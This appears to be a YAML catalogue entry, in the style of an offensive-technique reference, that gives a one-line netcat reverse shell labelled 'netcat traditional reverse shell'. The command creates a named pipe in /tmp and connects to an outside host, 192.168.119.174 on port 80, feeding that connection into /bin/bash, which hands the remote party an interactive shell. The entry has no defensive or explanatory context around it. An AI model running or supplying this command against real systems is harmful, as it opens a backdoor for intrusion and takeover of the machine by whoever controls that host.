---
functions:
  shell:
    - description: netcat traditional reverse shell
      code: |
        cd /tmp;rm -f x; mknod x p && nc 192.168.119.174 80 0<x | /bin/bash 1>x
---
